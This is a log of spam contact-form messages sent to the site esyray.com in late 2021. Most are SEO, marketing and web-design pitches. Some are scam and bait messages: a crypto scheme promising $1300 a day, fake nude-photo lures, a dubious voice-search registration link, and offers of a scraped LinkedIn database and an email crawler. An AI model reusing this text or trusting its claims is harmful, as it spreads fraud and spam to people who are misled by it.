+++ 2021-10-13 01:02:38 PM -- Email from: Lavina Ranson, -- subject: Get splendid DittART designer necklaces for you and your loved ones, -- email: sales1@dittart.com, -- Message is: Dear Madam, Dear Sir Are you looking for a new piece of exquisite jewelry for yourself or your loved ones and friends? Do you want to get new products for your customers? In that case,  DittART Designer Necklaces could be the right choice. DittART designer necklaces are originals created by a famous jewelry designer. Every model is unique. They contain premium glass beads and gemstones, some of which are handmade. The beads are slip over on a nylon thread or a metal string. Every necklace is delivered with the designer’s certificate and thus may become a splendid gift. Our necklaces own celebrities like country music stars, girlfriends of politicians, etc. In case of your interest in our designer necklaces, please check all models of these necklaces at our store https://dittart.com. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT, Eng., DittART Designer Necklaces, Denver, CO, sales@dittart.com, https://dittart.com
+++ 2021-10-13 09:51:57 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-10-15 07:16:22 PM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-10-15 09:24:40 PM -- Email from: erizonWeb.com – Web Designer/Developer, -- subject: Looking to build a professional website?, -- email: contact@erizonweb.com, -- Message is: Hi, my name is Erizon, I am a remote web designer/developer reaching out to offer my expertise in creating high-end websites.

I have been providing my services to clients in a wide range of industries around the world from small to large businesses. First impression matters. A website is always speaking on your behalf and the key to grabbing visitor attention is by creating a highly professional, visually engaging website with an outstanding design to increase engagement, sales/revenue, build brand awareness, and to ultimately establish a strong trust.

It really comes across to your visitors, the level of dedication and effort put towards presenting your products or services — even the smallest details can be picked up on.

Browse to see my portfolio here: https://erizonweb.com/

---------------

Feel free to schedule a meeting to discuss more details about your website in terms of redesigning, rebuilding or adding extra functionality.

Customer service is very important to me, I am committed to providing nothing less than the highest quality and I offer a full money-back guarantee to ensure 100% client satisfaction.

I advise not to contact me via email to prevent loss of communication. Many of my clients have been reporting emails not delivering and to ensure you’ll be able to get through to me, I have listed popular alternative methods of communications below:

Skype: live:erizon
Element: @erizon:matrix.org
Viber: +33 7532 96421
WhatsApp: +44 7832 916364
 
I look forward to hearing from you.
 
Best regards,
Erizon from erizonWeb.com
+++ 2021-10-15 11:56:51 PM -- Email from: Bank Setup, -- subject: Own a $1B Bank With $250K Within 30 Days. 100% Guaranteed, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-10-16 10:20:50 AM -- Email from: Alex B, -- subject: Inquiry, -- email: alex@usahempc.com, -- Message is: Hi there,

I am reaching out to check if you are accepting content on your blog from guest contributors.

If you do publish content from guest authors. I would love an opportunity to be one of them and continue our streak of publications to relevant sites in the industry.

I am writing a well-researched, data-driven, and in-depth blog post which might be a great addition to your blog.

Do you mind if I send you the draft so you can see if it’s a good fit for your blog?


Sincerely,
Alex
USAhemp.com
Molalla, OR 97038
Unsubscribe https://forms.gle/v2JoaVHg3Q32p25u5
+++ 2021-10-16 11:26:56 AM -- Email from: Nataanymn, -- subject: Hello Admin!, -- email: woodthighgire1988@gmail.com, -- Message is: Who want to see my nudes? https://localchicks3.com/?u=41nkd08&amp;o=8dhpkzk
+++ 2021-10-17 12:17:13 AM -- Email from: Nataanymn, -- subject: Hello Admin!, -- email: woodthighgire1988@gmail.com, -- Message is: Good evening handsome! What's left for you after depression? Fuck me and calm down! https://localchicks3.com/?u=41nkd08&amp;o=8dhpkzk
+++ 2021-10-17 06:20:17 PM -- Email from: Del Malone, -- subject: Hire Live Chat Agents &amp; Virtual Assitants, -- email: crotonz14@gmail.com, -- Message is: Hi there,

Hire Live Chat Agents - Unlimited chats - 24/7 coverage - Good Communication - Top Notch Support - Increase your sales 3 times with our 24/7 Live Chat Agents to generate more leads and excellent customer support. 
https://crotonz.com/live-chat.php

Hire Virtual Assistants and Agents for your website &amp; business. Flexible Plans/ Pricing and Expert Employees. 15 days Free Trial. 
https://crotonz.com/virtual-assistants.php

Best Regards
Sam Miller
info@crotonz.com
+++ 2021-10-18 02:51:00 PM -- Email from: Mike Durham, -- subject: Increase sales for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and reap the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Durham
 
support@monkeydigital.co
+++ 2021-10-18 09:14:00 PM -- Email from: Salvador Truebridge, -- subject: Get rid of any errors on the webpage - esyray.com - Reactivated, -- email: truebridge.salvador@googlemail.com, -- Message is: I noticed you’re working hard at esyray.com Online Marketing

Do you want to increase your website’s and fix potential mistakes? Finally, a comprehensive service where you can sit back and get the world’s best IT Specialists to do everything for you.

To efficiently increase sales over the internet you need  this big package:
	
https://best-marketers.com/technicalseo


Warm regards,
We offer the very best marketing services you may find on our shop for making big money in a small business, still not interested in getting clients? Here is a simple, 1-click unsubscribe link: https://best-marketers.com/?unsubscribe=esyray.com
+++ 2021-10-19 12:49:34 PM -- Email from: Ralf Braden, -- subject: , -- email: 3soufianbelly@kustermail.com, -- Message is: Who says you have to pay for web traffic? Here are a bunch of high traffic sites that take free ads: https://goolnk.com/1YD31D
+++ 2021-10-20 03:23:43 AM -- Email from: Roxana Cush, -- subject: Sachiko Stockman, -- email: LashandaLatney@hotmail.com, -- Message is: Everyone's always talking about business ideas that you can make money with but always seem to ask you for some kind of upfront payment before you can participate. I hate it when that happens which is why I've compiled this list of 21 different passive income ideas that DO NOT require any upfront money to be successful with. Download the free guide now: https://bit.ly/21PassiveIncomeIdeas
+++ 2021-10-20 09:28:52 AM -- Email from: Rhys Ontiveros, -- subject: Get splendid DittART designer necklaces for you and your loved ones, -- email: sales1@dittart.com, -- Message is: Dear Madam, Dear Sir Are you looking for a new piece of exquisite jewelry for yourself or your loved ones and friends? Do you want to get new products for your customers? In that case,  DittART Designer Necklaces could be the right choice. DittART designer necklaces are originals created by a famous jewelry designer. Every model is unique. They contain premium glass beads and gemstones, some of which are handmade. The beads are slip over on a nylon thread or a metal string. Every necklace is delivered with the designer’s certificate and thus may become a splendid gift. Our necklaces own celebrities like country music stars, girlfriends of politicians, etc. In case of your interest in our designer necklaces, please check all models of these necklaces at our store https://dittart.com. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT, Eng., DittART Designer Necklaces, Denver, CO, sales@dittart.com, https://dittart.com
+++ 2021-10-21 05:30:29 AM -- Email from: Garry Kunkel, -- subject: , -- email: 4abd.abuzalam@lemonjowo.buzz, -- Message is: Want to find out how to get free traffic from Google? Here's 20 ways to do it: https://shortest.link/1gym
+++ 2021-10-23 10:12:16 AM -- Email from: Steve James, -- subject: Explainer Video for esyray.com?, -- email: steve@explainervideos4u.xyz, -- Message is: Hi,

We'd like to introduce to you our explainer video service which we feel can benefit your site esyray.com.

Check out some of our existing videos here:
https://www.youtube.com/watch?v=zvGF7uRfH04
https://www.youtube.com/watch?v=cZPsp217Iik
https://www.youtube.com/watch?v=JHfnqS2zpU8

All of our videos are in a similar animated format as the above examples and we have voice over artists with US/UK/Australian accents.

They can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video such as Youtube, and can be embedded into your website or featured on landing pages.

Our prices are as follows depending on video length:
1 minute = $239
1-2 minutes = $339
2-3 minutes = $449

*All prices above are in USD and include an engaging, and captivating video, full script and voice-over.

If this is something you would like to discuss further, don't hesitate to get in touch.
If you are not interested, simply delete this message and we won't contact you again.

Kind Regards,
Steve
+++ 2021-10-25 11:19:28 AM -- Email from: Violet Griego, -- subject: , -- email: mrodukonr@crunchcompass.com, -- Message is: Here is a list of sites where you can post free ads:  https://urlday.cc/g3ypr
+++ 2021-10-26 02:31:22 AM -- Email from: Rapidlex Promotion, -- subject: RapidLex - translations done faster, -- email: promotion.rapidlex@seznam.cz, -- Message is: Any Language. Any Application. RapidLex Desktop Application for Windows 7/8/10, macOS &amp; Linux. 
Are you anyone working with foreign language texts? Do not waste your time by copying text from one application to other to get your translation. Just select your text in any application like Outlook, Word, Powerpoint, Pdf, e-book reader or any other and double press left Ctrl key, RapidLex pops-up and your translation is done. Free 14-Day Trial without registration needed. Download at http://www.rapidlex.com/.
+++ 2021-10-26 07:47:08 AM -- Email from: Milo Lyles, -- subject: We can help you to find the very best mate, -- email: sales1@wexxastrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Are you looking for a new mate? Do you have several potential candidates for your new mate, but do you need to decide who will be the best of them? We can help you to make this vital decision. We will prepare a highly accurate and detailed Romantic Compatibility report for you and your potential mate(s), where you will get a lot of precise and highly detailed information about a possible relationship with your new mate. This analysis will help you to establish an excellent and a long-lasting relationship with your new partner. Please check the sample Romantic Compatibility report at: https://wexxastrologicalstudio.com/PDF/Samples/Brianna_Ronald_Compatibility.pdf. We will be pleaased to hear from you. Have a great day. Best regards Craig WILSON, WEXX ASTROLOGICAL STUDIO, Denver, CO, sales@wexxastrologicalstudio.com, https://wexxastrologicalstudio.com
+++ 2021-10-27 04:40:05 AM -- Email from: Mike Carter, -- subject: Local SEO for more business, -- email: no-replydrype@gmail.com, -- Message is: Howdy 
 
We will enhance your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our services below, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike Carter
 
Speed SEO Digital Agency
+++ 2021-10-27 04:50:21 PM -- Email from: Angeles Derosa, -- subject: Contact Marketing, -- email: johanfourieltd@gmail.com, -- Message is: Hello.

For the first time ever we are offering our contact marketing software to companies.

If you have a B2B product that you would like to promote via contact forms or our dedicated email servers service feel free to contact me on:

Skype: cmsdevelopers
Telegram: https://t.me/custommarketing2
WhatsApp: +27 72 280 1952
Phone: +27 64 210 1993

Regards,
Johan Fourie
+++ 2021-10-28 06:08:26 PM -- Email from: YourWebCreative.com, -- subject: Let us create an outstanding website for your business, -- email: contact@yourwebcreative.com, -- Message is: Let us design a professional website for your business, with a 100% money-back guarantee.

Our experienced web design company will create a unique, professional website to remain with your business as a valuable asset continually bringing value in the form of sales and online trust/reputation.

We strive to provide quality web designs/building serivices for individuals and businesses around the world. We have a talented team who put their passion and creativity into producing outstanding work. 

Customer services is important to us, we will not stop until you are completely pleased with the final result — this is our goal.

Our recent website portfolio can be viewed here: https://www.yourwebcreative.com/portfolio/

We are happy to schedule a free consultation for you to share you thoughts with us.

Due to the large amount of our emails not delivering or being sent to junk/spam folders, we would highly advise contacting us via the following apps to prevent loss of communication:

Signal: +33 7 53 29 64 21
WhatsApp: +33 7 53 29 64 21
Viber: +33 7 53 29 64 21
Skype: yourwebcreative

We look forward to working with you.

Best regards,
The YourWebCreative team
+++ 2021-10-28 11:48:59 PM -- Email from: Archer McDowall, -- subject: Take a closer look at your website esyray.com, -- email: mcdowall.archer@hotmail.com, -- Message is: esyray.com, can we connect?

Online Marketing can be pivotal to the success of a business because it provides a shortcut into visibility that would otherwise take way too long to achieve or cost substantially more to buy.

Check this extraordinary service you need to accelerate your business progress in capturing phenomenal customers regularly:
	
https://your-it-technicians.com/backlinks-generator


Regards,
We offer amazing Promotion services you may find on our online shop for making big money in a small business, still not thinking about getting new clients? Here is a quick, 1-click unsubscribe link: https://your-it-technicians.com/?unsubscribe=esyray.com
+++ 2021-10-30 10:31:46 PM -- Email from: Earlene Lehner, -- subject: , -- email: lehner.earlene@gmail.com, -- Message is: How To Advertise Online Without Paying A Dime :https://cutt.ly/NRoF9OO
+++ 2021-10-31 07:25:18 PM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-11-02 02:08:33 PM -- Email from: Mike Dean, -- subject: quality monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
I have just took a look on your SEO for  esyray.com for its SEO metrics and saw that your website could use a push. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our plans here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
regards 
Mike Dean
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-11-03 12:00:40 PM -- Email from: Michealson, -- subject: Invite You to Test Hosting Service, -- email: terra@myloginsecurity.com, -- Message is: Invite You to Test Hosting Service

Hi,
 
I'm Terra from the American Hosting Association.

I’m reaching out to you because we are looking for bloggers/site owners like you to test the Bluehost hosting service.  

Bluehost is an excellent hosting service recommended by WordPress.org

Fr.ee WordPress Migration|30-Day Hosting Money-back Guarantee

You can visit https://www.myloginsecurity.com/hosting/ if you are interested.

Thank you for your time,

Terra Michealson

^^^^^^^^
Unsubscribe: https://www.myloginsecurity.com/unsubscribe
+++ 2021-11-03 06:19:59 PM -- Email from: Carla Orlandi, -- subject: Complete LinkedIn Database, -- email: carla.orlandi@hotmail.com, -- Message is: Hello!

Limited Time Offer - Complete LinkedIn Leads - $49

https://tinyurl.com/LinkedInDatabase
+++ 2021-11-04 02:36:57 PM -- Email from: Essie Elmslie, -- subject: Get splendid DittART designer necklaces for you and your loved ones, -- email: sales1@dittart.com, -- Message is: Dear Madam, Dear Sir Are you looking for a new piece of exquisite jewelry for yourself or your loved ones and friends? Do you want to get new products for your customers? In that case,  DittART Designer Necklaces could be the right choice. DittART designer necklaces are originals created by a famous jewelry designer. Every model is unique. They contain premium glass beads and gemstones, some of which are handmade. The beads are slip over on a nylon thread or a metal string. Every necklace is delivered with the designer’s certificate and thus may become a splendid gift. Our necklaces own celebrities like country music stars, girlfriends of politicians, etc. In case of your interest in our designer necklaces, please check all models of these necklaces at our store https://dittart.com. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT, Eng., DittART Designer Necklaces, Denver, CO, sales@dittart.com, https://dittart.com
+++ 2021-11-04 08:47:40 PM -- Email from: Estelle Andy, -- subject: (1) Estelle Sent You A Nude Pic!, -- email: estelleandy02@gmail.com, -- Message is: Estelle sent you 1 nude pic. She is online and very horny now.
Please click here to chat with her.
https://sexlovers.club/chat/EstelleAndy
+++ 2021-11-05 12:58:02 PM -- Email from: Ranker SEO, -- subject: Rank 1 on Google With 50% Off Diwali Sale, -- email: barnet.celsa@gmail.com, -- Message is: Rank 1 on Google With 50% Off Diwali Sale

The offer is applicable only for Indian customers.
Use this special festive sale to rank your website on the first page on Google. 50% off for the next 48 hours. World's leading SEO agency. Guaranteed ranking improvements in 3 months. 100% results-oriented link-building methods.

For more details, visit our website https://www.ranker.one
Contact us via skype: Ranker Support

Thanks.
+++ 2021-11-05 05:40:39 PM -- Email from: Ashton Cloud, -- subject: Email Spider and Crawler - https://tinyurl.com/EmailCrawler, -- email: spider@gmail.com, -- Message is: Hey. 

Introducing our email spider and crawler.

Extract emails from any website or from files. Demo here: https://www.youtube.com/watch?v=EDNCg-rsNP8

Unlimited Usage for $9.99 - https://tinyurl.com/EmailCrawler
+++ 2021-11-05 09:17:42 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-11-06 04:30:21 AM -- Email from: Jaqueline Coventry, -- subject: , -- email: coventry.jaqueline@gmail.com, -- Message is: Want more free traffic for your site? Post some free ads on these sites: https://urlday.cc/yfiac
+++ 2021-11-07 01:36:04 PM -- Email from: aspic, -- subject: I promised., -- email: tvb18zvg@icloud.com, -- Message is: Hi, this is Anna. I am sending you my intimate photos as I promised. https://tinyurl.com/yj98ynfv
+++ 2021-11-08 01:53:16 AM -- Email from: Nolan Selig, -- subject: esyray.com - your Verified Google Page Reviews, arrived!, -- email: nolan.selig@msn.com, -- Message is: Are you coming?

A business is no longer what we tell the client it is – it is what customers tell each other it is. Verified Google Page Reviews amazingly convert leads into clients.
Have a look at this mad plan you need to accelerate your company’s momentum in winning rich clients through your website:
	
https://your-web-marketing.com/google-business-and-maps-reviews


Best regards,
We offer the most effective Digital Marketing services you can find on our shop to make big money in a small business, still not interested in getting new clients? Here is an easy, 1-click unsubscribe link: https://your-web-marketing.com/?unsubscribe=esyray.com
+++ 2021-11-09 06:36:40 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-11-09 07:50:11 AM -- Email from: Mike Gibbs, -- subject: Get more dofollow backlinks for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
We all know the importance that dofollow link have on any website`s ranks. 
Having most of your linkbase filled with nofollow ones is of no good for your ranks and SEO metrics. 
 
Buy quality dofollow links from us, that will impact your ranks in a positive way 
https://www.digital-x-press.com/product/150-dofollow-backlinks/ 
 
Best regards 
Mike Gibbs
 
support@digital-x-press.com
+++ 2021-11-09 04:39:40 PM -- Email from: Estelle Andy, -- subject: (1) Estelle Sent You A Nude Pic!, -- email: estelleandy02@gmail.com, -- Message is: Estelle sent you 1 nude pic. She is online and very horny now.
Please click here to chat with her.
https://sexlovers.club/chat/EstelleAndy
+++ 2021-11-11 02:11:21 AM -- Email from: Wilhemina Slapoffski, -- subject: Hire Live Chat Agents &amp; Virtual Assitants, -- email: esolus12@gmail.com, -- Message is: Hi there,

Turnkey Chat Software &amp; Trained Live Chat Agents 24/7 for Your Industry. Request a Demo! Boost Your Leads, Engage Your Prospects &amp; Take Your Customer Service to a New Level. Easy Setup. App for iOs &amp; Android. Click here: https://crotonz.com/livechat/

Affordable &amp; Professional Web Development - Wordpress/ Woocommerce/ Shopify and Custom Web development. Highly Experienced and Certified. Know More: https://crotonz.com/website-design-virtual-assistant.php

Kind Regards,
Sam Miller
info@crotonz.com
+++ 2021-11-11 04:07:34 AM -- Email from: DanielCop, -- subject: HOT!!! Only for esyray.com to earn on investments from $ 1300 per day, -- email: leahgarceo@mailinator.com, -- Message is: PERSONAL INVITATION ONLY FOR esyray.com 
Only by the end of this week you have a chance to get into our team and start making passive income of $ 1300 per day, investing only $ 500 once. 
Surely someone from your neighbors, colleagues or acquaintances is already in our team and makes passive income on cryptocurrency from $ 1300 to $ 27000 per day and does not say anything to anyone. 
There are already 4997 people in our team, there are only 3 free places left. Hurry up! Sign up now, invest $ 500 and click the mouse button to get permanent passive income !!! 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc7PBEn&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGe6N_TnJtfngvlhur3zZQDVZ7WFA  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
PERSONAL INVITATION ONLY FOR esyray.com
+++ 2021-11-11 10:09:40 AM -- Email from: Jenny Stanfill, -- subject: Best Ad Network For Publishers And Bloggers In 2021, -- email: jenny@foremedia.net, -- Message is: Hey, I visited your site and I think that your content is amazing! It is really engaging and original, you must have worked so hard to generate such a quality content. We are ForeMedia and we help website owners with great websites to maximize the revenue they make from their website. I would love to buy Ad Spaces on your website and pay you per each impression of the ads on your site. We are Google Ad Exchange Premium partners and we work with more than 100 Ad Network &amp; thousands of premium direct advertisers who would LOVE to buy Ads directly from your site and we can guarantee to increase your revenue by at least 45% compared to other advertising solutions you are currently using. You deserve to earn more for your content and maximize your earning potential and I will help you unlock that potential! There is no cost, you can register to our monetization platform for free on this link: https://foremedia.net/start I will be available for you on the Live Chat if you need any help, or you can email me back to: jenny@foremedia.net if you have any questions. I have at least 17 Premium Advertisers that have asked me to approach you because they would like to advertise on your website on Premium eCPM [cost per impressions] basis. Have a good day &amp; feel free to ping me for any question! Click the link here for 1 minute registration to our platform [it's free!]: https://go.foremedia.net/u/start/
+++ 2021-11-12 12:55:05 AM -- Email from: Estelle Andy, -- subject: (1) Estelle Sent You A Nude Pic!, -- email: estelleandy02@gmail.com, -- Message is: Estelle sent you 1 nude pic. She is online and very horny now.
Please click here to chat with her.
https://sexlovers.club/chat/EstelleAndy
+++ 2021-11-12 04:32:24 AM -- Email from: Tilly Starnes, -- subject: starnes.tilly@gmail.com, -- email: kfaicel@test130.com, -- Message is: Automatic ad submission to thousands of ad sites every month. Submit your ad now: https://cutt.ly/KRdrur7
+++ 2021-11-13 04:57:04 PM -- Email from: Jina Schnaars, -- subject: This HIDDEN SECRET Can Help You Get Buyers-DAILY-Guaranteed, -- email: dabron2000@gmail.com, -- Message is: Hello,

Are you always looking for EFFECTIVE ways to get MORE
customers, EVERY DAY, EVERY WEEK and EVERY MONTH?

If so, please give me just 5 minutes of your precious time...

I GUARANTEE to show you a HIDDEN SECRET...wonder-working
...and...PROVEN formula...that will allow you to...

EASILY get many buyers...SKYROCKET your sales...and let you
smile all the way to the bank.

What's more, because of this below-the-radar strategy...
many businesses, are already and have QUIETLY been using 
it to sell just about anything. For example...

Javier Rodriguez used this remarkable method, to rake in
$100,000 in 12 months, in his insurance business.

Brett Jones of NuVision Auto Glass, says he brought
in over half a million dollars, with this astounding tactic.

Vernon Taylor, a fitness trainer, saw his sales skyrocket
to over 50%, just by using this underground technique.

Cajuan Mayo, did an impressive $200,000 in his affiliate
marketing business, with this one-of-a-kind secret tool.

So, here's the deal. If you too, want to get hundreds and
even thousands of buyers...DAILY and MONTHLY...

And would like to have access to this jaw-dropping secret 
weapon...unlike anything, you've ever seen before...

Then just click on the link below, for the thrilling details.

https://t2m.io/7N2DPX3

I promise you; it'll be worth your time.

Thank you for your time.

Sincerely,
John Eyubeh

P.S. Plus, forgot to mention, if you also want to be on the 
first page of Google (which gets 97% of all visitors)...and get
NEW buyers EVERY DAY, EVERY WEEK, and EVERY MONTH...
Then you need to see this wonder-working HIDDEN SECRET
software, which will help you do that. So, if you too want to
joinn thousands of businesses acrosss the world, who already
and QUIETLY using this one-of-a-kind tool to make money
from Google buyers, then click on this link below, for more
details: https://t2m.io/oLyWMB1
+++ 2021-11-14 04:02:21 AM -- Email from: Bart, -- subject: esyray.com, -- email: info@ghostar.org, -- Message is: Good Morning 
 
Meet your best Buds - True Wireless Earbuds with amazing sound, convenience, portability, &amp; affordability!

Order yours now at 50% OFF with FREE Shipping: https://musicontrol.shop
 
Best regards, 
 
Bart
+++ 2021-11-14 09:48:27 AM -- Email from: Paige Denning, -- subject: , -- email: denning.paige@googlemail.com, -- Message is: There's something wrong with your site. You don't have enough backlinks. Links from other sites will get you more organic traffic for free. Here's how you can get more of them for free from reputable sites: https://ai6.net/GhUF0f
+++ 2021-11-14 05:44:29 PM -- Email from: Estelle Andy, -- subject: (1) Estelle Sent You A Nude Pic!, -- email: bottoms.lonna@gmail.com, -- Message is: Estelle sent you 1 nude pic. She is online and very horny now.
Please click here to chat with her.
https://sexlovers.club/chat/EstelleAndy
+++ 2021-11-14 09:49:07 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-11-15 08:39:31 PM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-11-16 05:50:47 AM -- Email from: Deangelo, -- subject: Deangelo Patino, -- email: patino.deangelo84@yahoo.com, -- Message is: Good Morning 
 
